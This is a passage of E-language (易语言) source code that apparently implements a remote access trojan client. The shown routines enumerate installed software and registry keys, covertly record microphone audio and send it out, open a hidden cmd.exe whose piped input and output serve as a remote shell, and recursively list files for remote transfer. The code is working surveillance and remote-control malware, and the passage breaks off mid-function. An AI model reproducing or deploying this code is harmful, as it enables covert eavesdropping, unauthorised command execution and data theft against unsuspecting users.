        赋值 (信息2, 相加 (信息2, “1”, Value [n], “ё”))
    .判断结束
    赋值 (容器1, 相加 (容器1, 1))
    赋值 (信息2, 相加 (信息2, Data [n], “к”))
.计次循环尾 ()
.计次循环首 (枚举子键 (4, f, Value, Data, Type), n)
    .判断开始 (等于 (Value [n], “”))
        赋值 (信息2, 相加 (信息2, “0(默认)ё”))
    .默认
        赋值 (信息2, 相加 (信息2, “0”, Value [n], “ё”))
    .判断结束
    赋值 (容器1, 相加 (容器1, 1))
    赋值 (信息2, 相加 (信息2, Data [n], “к”))
.计次循环尾 ()
返回 (相加 (到文本 (容器1), “к”, 信息2))

.子程序 枚举软件列表, 文本型, 公开, 
.局部变量 n, 整数型, , , 
.局部变量 key, 文本型, , "0", 
.局部变量 数量, 整数型, , , 
.局部变量 容器2, 整数型, , , 
.局部变量 信息, 文本型, , , 
.局部变量 软件名, 文本型, , , 
.局部变量 反安装, 文本型, , , 
.局部变量 变量, 整数型, , , 

赋值 (数量, 0)
.计次循环首 (枚举文件夹 (4, “Software\Microsoft\Windows\CurrentVersion\Uninstall”, key), n)
    赋值 (软件名, 取文本注册项 (4, 相加 (“Software\Microsoft\Windows\CurrentVersion\Uninstall\”, key [n], “\DisplayName”), ))
    赋值 (反安装, 取文本注册项 (4, 相加 (“Software\Microsoft\Windows\CurrentVersion\Uninstall\”, key [n], “\UninstallString”), ))
    .如果真 (不等于 (软件名, “”))
        赋值 (数量, 相加 (数量, 1))
        赋值 (信息, 相加 (信息, 软件名, “ё”))
        .如果 (等于 (反安装, “”))
            赋值 (信息, 相加 (信息, “可能软件本身有卸载功能，请核对！”, “к”))
        .否则
            .如果 (等于 (取文本左边 (反安装, 1), #引号))
                赋值 (信息, 相加 (信息, 取文本中间 (反安装, 2, 相减 (取文本长度 (反安装), 2)), “к”))
            .否则
                赋值 (信息, 相加 (信息, 反安装, “к”))
            .如果结束
            
        .如果结束
        
    .如果真结束
    
.计次循环尾 ()
返回 (相加 (到文本 (数量), “к”, 信息))
 ' 返回 (“卸载列表” ＋ 到文本 (数量) ＋ “к” ＋ 信息)

.子程序 枚举文件夹, 整数型, 公开, 文件夹个数
.参数 参磁盘, 空白型, , 
.参数 参文件夹, 文本型, , 
.参数 匿名参数_1828, 文本型, 参考 数组, 

.局部变量 r, 整数型, , , 存放api函数的返回值
.局部变量 键句柄, 整数型, , , 
.局部变量 名字长度, 整数型, , , 
.局部变量 名字, 文本型, , , 
.局部变量 索引, 整数型, , , 
.局部变量 上次修改时间, 整数型, , , 
.局部变量 结果文本, 文本型, , , 

清除数组 (匿名参数_1828)
.如果真 (等于 (取文本左边 (参文件夹, 1), “\”))
    赋值 (参文件夹, 取文本右边 (参文件夹, 相减 (取文本长度 (参文件夹), 1)))
.如果真结束
赋值 (参磁盘, 映射根键 (参磁盘))
赋值 (r, RegOpenKeyExA (参磁盘, 参文件夹, 0, 983103, 键句柄))
.如果真 (等于 (r, 0))
    赋值 (名字长度, 255)
    赋值 (名字, 取空白文本 (255))
    赋值 (r, RegEnumKeyEx (键句柄, 索引, 名字, 名字长度, 0, 0, 0, 上次修改时间))
    .判断循环首 (等于 (r, 0))
        处理事件 ()
        加入成员 (匿名参数_1828, 取文本左边 (名字, 名字长度))
        赋值 (索引, 相加 (索引, 1))
        赋值 (名字长度, 255)
        赋值 (名字, 取空白文本 (255))
        赋值 (r, RegEnumKeyEx (键句柄, 索引, 名字, 名字长度, 0, 0, 0, 上次修改时间))
    .判断循环尾 ()
.如果真结束
RegCloseKey (键句柄)
返回 (取数组成员数 (匿名参数_1828))

.子程序 枚举注入文件表, 文本型, 公开, 
.局部变量 参磁盘, 空白型, , , 
.局部变量 参文件夹, 文本型, , , 
.局部变量 r, 整数型, , , 
.局部变量 键句柄, 整数型, , , 
.局部变量 名字长度, 整数型, , , 
.局部变量 名字, 文本型, , , 
.局部变量 索引, 整数型, , , 
.局部变量 结果文本, 文本型, , , 

赋值 (参文件夹, “SYSTEM\CurrentControlSet\Services\XPQSECL\Parameters\EF”)
赋值 (参磁盘, 映射根键 (4))
赋值 (r, RegOpenKeyExA (参磁盘, 参文件夹, 0, 983103, 键句柄))
.如果真 (等于 (r, 0))
    赋值 (名字长度, 255)
    赋值 (名字, 取空白文本 (255))
    赋值 (r, RegEnumValue (键句柄, 索引, 名字, 名字长度, 0, 0, 0, 0))
    .判断循环首 (等于 (r, 0))
        赋值 (名字, 取文本左边 (名字, 名字长度))
        .如果真 (不等于 (名字, “”))
            赋值 (结果文本, 相加 (结果文本, 到文本 (取数值注册项 (4, 相加 (参文件夹, “\”, 名字), 0)), “\”, 名字, “|”))
        .如果真结束
        赋值 (索引, 相加 (索引, 1))
        赋值 (名字长度, 255)
        赋值 (名字, 取空白文本 (255))
        赋值 (r, RegEnumValue (键句柄, 索引, 名字, 名字长度, 0, 0, 0, 0))
    .判断循环尾 ()
.如果真结束
RegCloseKey (键句柄)
返回 (结果文本)

.程序集 声音程序集, , , 

.程序集变量 录音格式, WAVEFORMATEX, , , 
.程序集变量 录音设备号, 整数型, , , 
.程序集变量 缓存大小, 整数型, , , 
.程序集变量 缓存1, 字节集, , , 
.程序集变量 缓存1地址, 整数型, , , 
.程序集变量 录音数据1, WAVEHDR, , , 
.程序集变量 处理序号, 整数型, , , 
.子程序 刷新录音设备, 空白型, , 
传送数据子程序 (1, 相加 ({ 10 }, { 1 }, 到字节集 (到文本 (查找录音设备 ()))))

.子程序 录音开始, 空白型, , 
.如果 (大于或等于 (查找录音设备 (), 1))
    赋值 (录音设备号, 1)
    赋值 (录音格式.格式, 1)
    赋值 (录音格式.声道, 1)
    赋值 (录音格式.采样率, 22050)
    赋值 (录音格式.位数, 8)
    赋值 (录音格式.数据量, 相除 (相乘 (录音格式.位数, 录音格式.采样率, 录音格式.声道), 8))
    赋值 (录音格式.对齐单位, 相除 (相乘 (录音格式.位数, 录音格式.声道), 8))
    打开录音设备 (录音设备号, -1, 录音格式, &数据处理, 0, 196608)
    赋值 (缓存大小, 5120)
    赋值 (缓存1, 取空白字节集 (缓存大小))
    赋值 (缓存1地址, 取地址_ (缓存1, 缓存1, 0))
    赋值 (录音数据1.缓冲指针, 缓存1地址)
    赋值 (录音数据1.缓冲大小, 缓存大小)
    准备缓冲 (录音设备号, 录音数据1, 32)
    增加缓冲 (录音设备号, 录音数据1, 32)
    赋值 (处理序号, 1)
    开始录音 (录音设备号)
.否则
    信息框 (“没有找到录音设备！”, 0, “信息”)
.如果结束


.子程序 数据处理, 空白型, , 
.参数 hwi, 整数型, , 
.参数 uMsg, 整数型, , 
.参数 dwInstance, 整数型, , 
.参数 dwParam1, 整数型, , 
.参数 dwParam2, 整数型, , 

.局部变量 临时, 字节集, , , 

.判断开始 (等于 (uMsg, 960))
    .判断开始 (等于 (处理序号, 1))
        赋值 (处理序号, 1)
        赋值 (声音, 相加 (声音, 缓存1))
        增加缓冲 (录音设备号, 录音数据1, 32)
        赋值 (临时, 压缩数据_ (声音))
        .如果真 (大于 (取字节集长度 (临时), 150))
            传送数据子程序 (1, 相加 ({ 10 }, { 2 }, 到字节集 (临时)))
        .如果真结束
        
        赋值 (声音, 到字节集 (“”))
    .判断 (等于 (处理序号, 0))
        输出调试文本 (相加 (“录音设备号 = ”, 到文本 (录音设备号)))
        输出调试文本 (1)
        清除缓冲 (录音设备号, 录音数据1, 32)
        输出调试文本 (2)
        停止录音 (录音设备号)
        输出调试文本 (3)
        关闭录音设备 (录音设备号)
        输出调试文本 (4)
    .默认
        
    .判断结束
    
.判断 (等于 (uMsg, 958))
     ' 标签3.标题 ＝ “正在录取数据中...”
.默认
    
.判断结束


.子程序 停止语音, 空白型, , 
赋值 (处理序号, 0)

.程序集 程序集_管道, , , 

.程序集变量 加入文本, 文本型, , , 
.程序集变量 iption, 文本型, , , 
.程序集变量 进程信息, 进程信息, , , 
.程序集变量 管道b, 整数型, , , 
.程序集变量 管道a, 整数型, , , 
.程序集变量 安全属性b, 安全属性, , , SECURITY_ATTRIBUTES
.程序集变量 安全属性a, 安全属性, , , 
.程序集变量 启动信息, 启动信息, , , 
.程序集变量 a输出管道, 整数型, , , 
.程序集变量 a输入管道, 整数型, , , 
.程序集变量 b输出管道, 整数型, , , 
.程序集变量 b输入管道, 整数型, , , 
.程序集变量 DOS进入许可证, 多线程许可证, , , 
.子程序 控制台_连接, 整数型, , 连接到创建的一个隐式CMD进程,以实现对控制台的标准输入与输出操作.返回CMD进程的进程ID,0意味着失败,非0表示成功.
.参数 CMD名称, 文本型, 可空, 默认名称是CMD.EXE,如果被改名,请在这里改为相应名称,备注:要创建一个CMD进程,程序必须要知道它的名称.
.参数 运行目录, 文本型, 可空, 创建CMD进程时的默认目录,这里默认在系统目录,如果要指定其它目录,请在目录名后加上"\"

.局部变量 shell, 文本型, , , 
.局部变量 系统目录, 文本型, , , 
.局部变量 创建进程, 整数型, , , 
.局部变量 实际尺寸, 整数型, , , 
.局部变量 CMD, 文本型, , , 

.如果真 (不等于 (取操作系统类别 (), 3))
    输出调试文本 (“Error:控制台连接失败,原因:只对NT以上系统有效!”)
    返回 (0)
.如果真结束
 ' 是否已经断开连接
.如果真 (连接DOS)
    输出调试文本 (“Error:控制台已经连接,请不要重复连接!”)
    返回 (进程信息.进程ID)
.如果真结束
 ' 匿名管道A,用来写
赋值 (安全属性a.长度, 12)
赋值 (安全属性a.权限, 0)
赋值 (安全属性a.句柄, -1)
赋值 (管道a, 创建匿名管道 (a输出管道, a输入管道, 安全属性a, 0))
.如果真 (等于 (管道a, 0))
    输出调试文本 (“Error:创建匿名管道失败,原因:创建匿名管道失败!”)
    返回 (0)
.如果真结束
 ' 匿名管道B,用来读
赋值 (安全属性b.长度, 12)
赋值 (安全属性b.权限, 0)
赋值 (安全属性b.句柄, -1)
赋值 (管道b, 创建匿名管道 (b输出管道, b输入管道, 安全属性b, 0))
 ' 创建CMD进程,重定向输入和输出到匿名管道
获取启动信息_ (启动信息) ' 用本进程启动信息填充CMD启动信息其它项
赋值 (启动信息.dwFlags, 257) ' 大小类型
赋值 (启动信息.hStdInput, a输出管道) ' 重定向标准输入
赋值 (启动信息.hStdOutput, b输入管道) ' 重定向标准输出
赋值 (启动信息.hStdError, b输入管道) ' 重定向标准错误输出
赋值 (启动信息.wShowWindow, 0) ' 隐藏运行
赋值 (系统目录, 相加 (取系统目录 (), “\”))
.如果真 (是否为空 (CMD名称))
    赋值 (CMD名称, “cmd.exe”)
.如果真结束
.如果 (等于 (是否为空 (运行目录), 真))
    赋值 (创建进程, 创建进程 (0, CMD名称, 0, 0, -1, 0, 0, 系统目录, 启动信息, 进程信息))
.否则
    赋值 (创建进程, 创建进程 (0, CMD名称, 0, 0, -1, 0, 0, 运行目录, 启动信息, 进程信息))
.如果结束
.如果真 (等于 (创建进程, 0))
    输出调试文本 (“Error:控制台连接失败,原因:创建CMD进程失败!”)
    返回 (0)
.如果真结束
赋值 (连接DOS, 真) ' 做个标记先
赋值 (DOS进入许可证, 创建进入许可证_ ())
字符 (0)
返回 (进程信息.进程ID)

.子程序 控制台_发送命令, 整数型, , 向已经连接的控制台发送命令(标准输入),返回输入命令的实际长度,返回0意味着失败,非0表示成功.
.参数 命令名, 文本型, , 可以是任何控制台命令,注意:已经对exit命令做了处理,输入命令"exit"可以达到断开连接的目地.

.局部变量 实际尺寸, 整数型, , , 
.局部变量 shell, 字节集, , , 

.如果真 (等于 (连接DOS, 真))
    赋值 (命令名, 删首尾空 (命令名))
    .如果真 (不等于 (命令名, “”))
        .如果真 (等于 (文本比较 (命令名, “exit”, 假), 0)) ' 判断是否是退出命令
            控制台_断开连接 ()
            返回 (4)
        .如果真结束
        .如果真 (等于 (文本比较 (命令名, “cls”, 假), 0)) ' 清屏命令
            赋值 (shell, 到字节集 (相加 (取系统目录 (), “>”)))
            写文件 (b输入管道, shell, 取字节集长度 (shell), 实际尺寸, 0)
            返回 (3)
        .如果真结束
        
    .如果真结束
     ' 很关键的一步,写入的命令最后一定要加上换行符,不然CMD是不会理你的,我可是试了好久才明白的,555,好辛苦
    赋值 (shell, 到字节集 (相加 (命令名, #换行符)))
    写文件 (a输入管道, shell, 取字节集长度 (shell), 实际尺寸, 0)
.如果真结束
返回 (实际尺寸)

.子程序 控制台_取回结果, 逻辑型, , 取回已连接控制台的命令提示(控制台标准输出与标准错误输出,也就是"回显"),成功返回真,失败返回假..
.如果真 (连接DOS)
    启动线程_ (&读管道)
    返回 (真)
.如果真结束
返回 (假)

.子程序 控制台_断开连接, 逻辑型, , 断开一个已经连接的控制台,成功返回真,失败返回假.注意:在标准输入里输入命令"exit"也可以达到断开连接的目地.
.如果真 (连接DOS)
    删除进入许可证_ (DOS进入许可证)
    关闭句柄_ ()
    .如果真 (结束进程 (打开进程句柄 (1, 假, 进程信息.进程ID), 3389))
        赋值 (连接DOS, 假)
        返回 (真)
    .如果真结束
    
.如果真结束
返回 (假)

.子程序 关闭句柄_, 空白型, , 
CloseHandle (a输出管道)
CloseHandle (b输出管道)
CloseHandle (a输入管道)
CloseHandle (b输入管道)


.子程序 读管道, 空白型, , 
.局部变量 实际尺寸, 整数型, , , 
.局部变量 缓存, 字节集, , , 
.局部变量 未加密数据, 字节集, , , 

进入许可区_ (DOS进入许可证)
赋值 (缓存, 取空白字节集 (260))
.判断循环首 (并且 (不等于 (_读文件 (b输出管道, 缓存, 260, 实际尺寸, 0), 0), 不等于 (实际尺寸, 0)))
    赋值 (加入文本, 到文本 (取字节集左边 (缓存, 实际尺寸)))
    传送数据子程序 (1, 相加 ({ 11 }, { 1 }, 到字节集 (加入文本))) ' 控制客户发送文本 (返回文本)
     ' 未加密数据 ＝ 到字节集 (“系统信息” ＋ “||~!@*$%^&||” ＋ “读DOS” ＋ “||~!@*$%^&||” ＋ 加入文本)
     ' 发送数据 (未加密数据)
    延时 (10)
.判断循环尾 ()
退出许可区_ (DOS进入许可证)

.子程序 取系统目录, 文本型, , 
.局部变量 缓冲区, 文本型, , , 
.局部变量 长度, 整数型, , , 

赋值 (缓冲区, 取空白文本 (260))
赋值 (长度, 取系统目录_ (缓冲区, 260))
返回 (删首尾空 (缓冲区))

.程序集 文件目录, , , 

.子程序 文件_寻找文件, 整数型, , 寻找文件增强版，能得到更多信息。返回找到的文件个数。
.参数 欲列出的文件, 文本型, , 支持通配符。
.参数 欲列出文件的属性, 整数型, 可空, 可以被省略。参数值可以为以下常量值或其和： 1、#只读文件； 2、#隐藏文件； 4、#系统文件； 16、#子目录； 32、#存档文件；55、#所有文件(包括子目录)。通过将这些常量值加起来可以一次设置多个文件属性。如果省略本参数，默认为搜寻除子目录外的所有文件。
.参数 列出的文件名, 文本型, 参考 可空 数组, 
.参数 列出的文件属性, 整数型, 参考 可空 数组, 
.参数 列出的文件尺寸, 长整数型, 参考 可空 数组, 支持大文件，请提供长整数数组。支持同时取出目录大小。
.参数 列出的文件创建时间, 日期时间型, 参考 可空 数组, 
.参数 列出的文件最后访问时间, 日期时间型, 参考 可空 数组, 
.参数 列出的文件最后修改时间, 日期时间型, 参考 可空 数组, 

.局部变量 hfind, 整数型, , , 
.局部变量 data, WIN32_FIND_DATA, , , 

清除数组 (列出的文件名)
清除数组 (列出的文件属性)
清除数组 (列出的文件尺寸)
清除数组 (列出的文件创建时间)
清除数组 (列出的文件最后访问时间)
清除数组 (列出的文件最后修改时间)
.如果真 (是否为空 (欲列出文件的属性))
    赋值 (欲列出文件的属性, 39) ' 55-16
.如果真结束
赋值 (hfind, FindFirstFile (欲列出的文件, data))
.如果真 (等于 (hfind, -1))
    返回 (0)
.如果真结束
.循环判断首 ()
    .如果真 (或者 (等于 (位与 (data.dwFileAttributes, 欲列出文件的属性), 0), 并且 (是否为空 (欲列出文件的属性), 不等于 (位与 (data.dwFileAttributes, 16), 0))))
        到循环尾 ()
    .如果真结束
    加入成员 (列出的文件名, 字节数组_到文本 (data.cFileName))
    .如果真 (等于 (是否为空 (列出的文件属性), 假))
        加入成员 (列出的文件属性, data.dwFileAttributes)
    .如果真结束
    .如果真 (等于 (是否为空 (列出的文件创建时间), 假))
        FileTimeToLocalFileTime (data.ftCreationTime, data.ftCreationTime)
        加入成员 (列出的文件创建时间, FileTimeToVariantTime (data.ftCreationTime))
    .如果真结束
    .如果真 (等于 (是否为空 (列出的文件最后访问时间), 假))
        FileTimeToLocalFileTime (data.ftLastAccessTime, data.ftLastAccessTime)
        加入成员 (列出的文件最后访问时间, FileTimeToVariantTime (data.ftLastAccessTime))
    .如果真结束
    .如果真 (等于 (是否为空 (列出的文件最后修改时间), 假))
        FileTimeToLocalFileTime (data.ftLastWriteTime, data.ftLastWriteTime)
        加入成员 (列出的文件最后修改时间, FileTimeToVariantTime (data.ftLastWriteTime))
    .如果真结束
    .如果真 (等于 (是否为空 (列出的文件尺寸), 假))
        .如果真 (等于 (位与 (data.dwFileAttributes, 16), 0))
            加入成员 (列出的文件尺寸, 相加 (相乘 (data.nFileSizeHigh, 65536), data.nFileSizeLow))
            到循环尾 ()
        .如果真结束
        .如果真 (并且 (不等于 (字节数组_到文本 (data.cFileName), “.”), 不等于 (字节数组_到文本 (data.cFileName), “..”)))
            加入成员 (列出的文件尺寸, 目录_取目录大小 (相加 (文本_取路径 (欲列出的文件), “\”, 字节数组_到文本 (data.cFileName))))
            到循环尾 ()
        .如果真结束
        加入成员 (列出的文件尺寸, 0)
    .如果真结束
    
.循环判断尾 (不等于 (FindNextFile (hfind, data), 0))
FindClose (hfind)
返回 (取数组成员数 (列出的文件名))

.子程序 FileTimeToVariantTime, 日期时间型, , 
.参数 FileTime, FILETIME, , 

.局部变量 系统时间, 系统时间, , , 
.局部变量 时间, 日期时间型, , , 

FileTimeToSystemTime (FileTime, 系统时间)
SystemTimeToVariantTime (系统时间, 时间)
返回 (时间)

.子程序 目录_取目录大小, 长整数型, , 
.参数 目录路径, 文本型, , 

.局部变量 大小, 长整数型, , "0", 
.局部变量 结果, 长整数型, , , 
.局部变量 计次, 整数型, , , 

.计次循环首 (文件_寻找文件 (相加 (目录路径, “\*”), 55, , , 大小), 计次)
    赋值 (结果, 相加 (结果, 大小 [计次]))
.计次循环尾 ()
返回 (结果)

.子程序 字节数组_到文本, 文本型, , 
.参数 字节数组, 字节型, 数组, 

.局部变量 i, 字节型, , "0", 

.如果真 (等于 (取数组成员数 (字节数组), 0))
    返回 (“”)
.如果真结束
赋值 (i, 字节数组)
加入成员 (i, 0)
返回 (lstrcpyn (i, 0, 0))

.子程序 文本_取路径, 文本型, , 
.参数 文本, 文本型, , 

.局部变量 i, 文本型, , , 

赋值 (i, 文本)
PathRemoveFileSpec (i)
返回 (i)

.子程序 文件下载寻找文件, 空白型, , 
.参数 搜索目录, 文本型, , 

.局部变量 寻找到的文件名, 文本型, , "0", 
.局部变量 X, 空白型, , , 
.局部变量 文件下载搜索到的文件, 文本型, 静态, , 
.局部变量 文件名, 文本型, , , 

处理事件 ()

.如果真 (不等于 (取文本右边 (搜索目录, 1), “\”))
    赋值 (搜索目录, 相加 (搜索目录, “\”))
.如果真结束
文件_寻找文件 (相加 (搜索目录, “*”), , 寻找到的文件名)
.计次循环首 (取数组成员数 (寻找到的文件名), X)
    
    赋值 (文件名, 相加 (搜索目录, 寻找到的文件名 [X]))
    赋值 (文件下载搜索到的文件, 相加 (文件下载搜索到的文件, 文件名, “%工|(”, 到文本 (取文件尺寸 (文件名)), “$^&*()%^”))
    
    .如果真 (大于 (取文本长度 (文件下载搜索到的文件), 5000))
        传送数据子程序 (1, 相加 ({ 4 }, { 4 }, 到字节集 (文件下载搜索到的文件)))
        赋值 (文件下载搜索到的文件, “”)
    .如果真结束
    
.计次循环尾 ()

文件_寻找文件 (相加 (搜索目录, “*”), #子目录, 寻找到的文件名)
.计次循环首 (取数组成员数 (寻找到的文件名), X)
    .如果真 (不等于 (取文本左边 (寻找到的文件名 [X], 1), “.”))
        文件下载寻找文件 (相加 (搜索目录, 寻找到的文件名 [X]))
    .如果真结束
    
.计次循环尾 ()

.如果真 (大于 (取文本长度 (文件下载搜索到的文件), 1))
    传送数据子程序 (1, 相加 ({ 4 }, { 4 }, 到字节集 (文件下载搜索到的文件)))
    赋值 (文件下载搜索到的文件, “”)
.如果真结束


.子程序 文件目录_取路径文件名, 文本型, 公开, 取指定路径中的文件名(返回文件名)
.参数 路径, 文本型, , 完整路径

返回 (取文本右边 (路径, 相减 (取文本长度 (路径), 倒找文本 (路径, “\”, , 假))))

.子程序 文件目录_取文件路径, 文本型, 公开, 
.参数 文件, 文本型, , 完整路径

返回 (取文本左边 (文件, 倒找文本 (文件, “\”, , 假)))


.子程序 文件目录_文件名取后缀, 文本型, 公开, 返回数据 ".exe" 的形式
.参数 文件名, 文本型, , 

返回 (取文本右边 (文件名, 相加 (相减 (取文本长度 (文件名), 倒找文本 (文件名, “.”, , 假)), 1)))

.子程序 文件目录_文件名删除后缀, 文本型, 公开, 
.参数 文件名, 文本型, , 

.局部变量 KK, 整数型, , , 

赋值 (KK, 倒找文本 (文件名, “.”, , 假))
.如果 (等于 (KK, -1))
    返回 (文件名)
.否则
    返回 (取文本左边 (文件名, 相减 (KK, 1)))
.如果结束


.子程序 回收站_删除到回收站, 逻辑型, 公开, 可将文件或目录删除至回收站。参考了“美女勿进”的代码。成功返回真，失败返回假。
.参数 文件或目录名, 文本型, , 
.参数 删除选项, 整数型, 可空, 0.#无任何显示；4.#不显示进度；16.#不询问删除；1024.#不提示错误。如果被省略，默认值为0。如果要选择两项，就用“位或”将两个选项连接，例如：既不询问删除，也不提示错误则就提供参数：位或(16,1024)。

.局部变量 类型, SHFILEOPSTRUCT, , , 

赋值 (类型.wFunc, 3)
赋值 (类型.pFrom, 相加 (到字节集 (文件或目录名), { 0, 0 }))
.如果 (等于 (删除选项, 0))
    赋值 (类型.fFlags, 1108) ' 位或 (64, 4, 1024, 16)
.否则
    赋值 (类型.fFlags, 位或 (64, 删除选项))
.如果结束
返回 (等于 (SHFileOperationA (类型), 0))

.子程序 回收站_清空回收站, 空白型, 公开, 
.参数 选项, 整数型, 可空, 0.既询问删除，也播放提示音乐；1.不询问删除；4.不播放提示音乐；5.既不询问删除，也不播放提示音乐。默认为5。
.参数 根目录, 文本型, 可空, 比如要清空D盘下的回收站就提供参数：“D:\”，如果被省略，默认为空文本，即清空所有回收站。

SHEmptyRecycleBinA (0, 根目录, 选择 (是否为空 (选项), 5, 选项))

.子程序 回收站_是否有文件, 逻辑型, 公开, 有返回真，无返回假。
.参数 回收站位置, 文本型, 参考 可空 数组, 可提供变量接收存在文件的回收站的位置，例如如果C盘的回收站有文件则返回“C:\RECYCLER\”，数组每一个成员为一个位置。

.局部变量 结构, SHQUERYRBINFO, , , 
.局部变量 计次, 整数型, , , 
.局部变量 盘符, 文本型, , "0", 

.如果真 (等于 (是否为空 (回收站位置), 假))
    清除数组 (回收站位置)
.如果真结束
磁盘_取驱动器列表 (盘符)
赋值 (结构.结构大小, 20)
.计次循环首 (取数组成员数 (盘符), 计次)
    SHQueryRecycleBinA (相加 (盘符 [计次], “RECYCLER\”), 结构)
    .如果真 (大于 (结构.文件数, 0))
        .如果真 (是否为空 (回收站位置))
            返回 (真)
        .如果真结束
        加入成员 (回收站位置, 相加 (盘符 [计次], “RECYCLER\”))
        
    .如果真结束
    
.计次循环尾 ()
返回 (不等于 (取数组成员数 (回收站位置), 0))

.子程序 目录操作_改变目录, 逻辑型, 公开, 
.参数 欲改变到的目录, 文本型, , 

返回 (SetCurrentDirectoryA (欲改变到的目录))

.子程序 目录操作_取当前目录, 文本型, 公开, 
.局部变量 长度, 整数型, , , 
.局部变量 路径, 文本型, , , 

赋值 (长度, GetCurrentDirectoryA (长度, 路径))
赋值 (路径, 取空白文本 (长度))
返回 (选择 (不等于 (GetCurrentDirectoryA (长度, 路径), 0), 路径, “”))

.子程序 目录操作_创建目录, 整数型, 公开, 1：创建失败 2：目录已经存在 0：创建成功
.参数 目录完整路径, 文本型, , 

.局部变量 文件夹名称组, 文本型, , "0", 
.局部变量 数组成员数量, 整数型, , , 
.局部变量 临时文本, 文本型, , , 
.局部变量 计次变量, 整数型, , , 
.局部变量 临时目录数组, 文本型, , "0", 

赋值 (临时目录数组, 分割文本 (目录完整路径, “\”, ))
复制数组 (文件夹名称组, 临时目录数组)
赋值 (数组成员数量, 取数组成员数 (文件夹名称组))
.如果真 (小于 (数组成员数量, 2))
    返回 (1)
.如果真结束
赋值 (临时文本, 文件夹名称组 [1]) ' 磁盘符号
.如果真 (不等于 (取文本长度 (临时文本), 2)) ' c:
    返回 (1)
.如果真结束
.如果真 (不等于 (取文本右边 (临时文本, 1), “:”)) ' 是否为“:”
    返回 (1)
.如果真结束

.计次循环首 (相减 (数组成员数量, 1), 计次变量)
    .如果真 (或者 (等于 (文件夹名称组 [相加 (计次变量, 1)], “.”), 等于 (文件夹名称组 [相加 (计次变量, 1)], “..”), 等于 (文件夹名称组 [相加 (计次变量, 1)], “”)))
        返回 (1)
    .如果真结束
    赋值 (临时文本, 相加 (临时文本, “\”, 文件夹名称组 [相加 (计次变量, 1)]))
    .如果 (等于 (寻找文件 (临时文本, #子目录), “”))
        .如果真 (等于 (CreateDirectoryA (临时文本, 0), 假))
            返回 (1) ' 创建失败
        .如果真结束
        
    .否则
        .如果真 (等于 (计次变量, 相减 (数组成员数量, 1)))
            返回 (2) ' 最后一个文件夹已经存在
        .如果真结束
        
    .如果结束
    
.计次循环尾 ()
返回 (0)

.子程序 目录操作_文件夹是否存在, 逻辑型, 公开, 
.参数 欲测试的文件夹名称, 文本型, , 

.如果 (等于 (PathIsDirectoryA (欲测试的文件夹名称), 0))
    返回 (假)
.否则
    返回 (真)
.如果结束


.子程序 目录操作_文件夹是否为空, 逻辑型, 公开, 为空则返回真，反之假。如果文件夹不存在也会返回假。
.参数 欲测试的文件夹名称, 文本型, , 

返回 (PathIsDirectoryEmptyA (欲测试的文件夹名称))

.子程序 目录操作_移动目录, 逻辑型, 公开, 
.参数 欲移动的目录, 文本型, , 
.参数 移动到的位置, 文本型, , 

返回 (目录操作_进度移动 (欲移动的目录, 移动到的位置))

.子程序 目录操作_复制目录, 逻辑型, 公开, 
.参数 欲复制的目录, 文本型, , 
.参数 复制到的位置, 文本型, , 

返回 (目录操作_进度复制 (欲复制的目录, 复制到的位置))

.子程序 目录操作_删除目录, 逻辑型, 公开, 
.参数 欲删除的目录, 文本型, , 

返回 (目录操作_进度删除 (欲删除的目录))

.子程序 目录操作_浏览文件夹, 文本型, 公开, 打开一个对话框，浏览系统中存在的所有文件夹，返回被选定文件夹的路径名，如果未选中任何文件夹，则返回空文本。本命令为初级命令。参考了“泪闯天涯”的源码。
.参数 标题, 文本型, 可空, 本参数提供显示在对话框上部的标题文本。
.参数 初始目录, 文本型, 可空, 默认为桌面。
.参数 列出文件, 逻辑型, 可空, 是否显示文件列表，默认为假。
.参数 父窗口句柄, 整数型, 可空, 本参数提供需要打开浏览文件夹父窗口的句柄。可空。

.局部变量 BI, BROWSEINFO, , , 
.局部变量 lPid, 整数型, , , 
.局部变量 sPath, 文本型, , , 
.局部变量 iPos, 整数型, , , 
.局部变量 lPidlRoot, ITEMIDLIST, , , 
.局部变量 flName, 文本型, , , 
.局部变量 缓冲区, 字节集, , , 
.局部变量 字符数目, 整数型, , , 

SHGetFolderLocation (父窗口句柄, 0, 0, 0, lPidlRoot)
.如果真 (是否为空 (标题))
    赋值 (标题, “请选择文件夹路径”)
.如果真结束
赋值 (BI.hOwner, 父窗口句柄)
赋值 (BI.pidlRoot, lPidlRoot.mkid.cb)
.如果真 (等于 (是否为空 (初始目录), 假))
    赋值 (字符数目, MultiByteToWideChar (0, 0, 初始目录, -1, {  }, 0))
    赋值 (缓冲区, 取空白字节集 (相乘 (字符数目, 2)))
    MultiByteToWideChar (0, 0, 初始目录, -1, 缓冲区, 字符数目)
    赋值 (BI.pidlRoot, ILCreateFromPathW (缓冲区))
.如果真结束
赋值 (BI.pszDisplayName, 取空白文本 (260))
赋值 (BI.lpszTitle, 标题)
赋值 (BI.ulFlags, 119)
.如果真 (列出文件)
    赋值 (BI.ulFlags, 91127)
.如果真结束
赋值 (lPid, SHBrowseForFolderA (BI))
.如果 (不等于 (寻找文本 (删首尾空 (BI.pszDisplayName), “?”, 1, 假), -1))
    赋值 (flName, “”)
.否则
    .如果 (不等于 (lPid, 0))
        赋值 (sPath, 取空白文本 (260))
        .如果真 (不等于 (SHGetPathFromIDListA (lPid, sPath), 0))
            赋值 (flName, sPath)
            .如果真 (等于 (取文本长度 (flName), 3))
                赋值 (flName, 取文本左边 (flName, 2))
            .如果真结束
            
        .如果真结束
        
    .否则
        赋值 (flName, 相加 (“\\”, 删首尾空 (BI.pszDisplayName)))
        .如果真 (等于 (flName, “\\”))
            赋值 (flName, “”)
        .如果真结束
        
    .如果结束
    
.如果结束
CoTaskMemFree (lPid)
.如果真 (等于 (取文本长度 (flName), 2))
    
    赋值 (flName, 相加 (flName, “\”))
.如果真结束
返回 (flName)

.子程序 目录操作_进度移动, 逻辑型, 公开, 可移动文件，也可移动目录。成功返回真，失败返回假。参考了“美女勿进”的代码。
.参数 被移动的文件或目录, 文本型, , 
.参数 移动到的位置, 文本型, , 
.参数 复制选项, 整数型, 可空, 1.#既不提示错误，也不显示进度；2.#不提示错误，显示进度；3.#不显示进度；4.#既提示错误，又显示进度。如果被省略，默认值为 1 。

.局部变量 类型, SHFILEOPSTRUCT, , , 

赋值 (类型.wFunc, 1)
赋值 (类型.pFrom, 相加 (到字节集 (被移动的文件或目录), { 0, 0 }))
赋值 (类型.pTo, 相加 (到字节集 (移动到的位置), { 0, 0 }))
.如果 (并且 (大于 (复制选项, 0), 小于或等于 (复制选项, 4)))
